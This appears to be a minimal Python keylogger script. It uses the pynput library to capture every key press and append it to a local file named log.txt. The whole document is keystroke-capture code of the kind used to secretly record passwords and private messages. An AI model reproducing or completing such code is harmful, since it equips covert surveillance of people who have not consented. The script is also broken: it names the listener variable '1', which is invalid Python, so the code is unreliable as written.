from pynput.keyboard import Listener


def writeofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    with open("log.txt", "a") as f:
        f.write(keydata)


with Listener(on_press=writeofile) as 1:
    1.join()
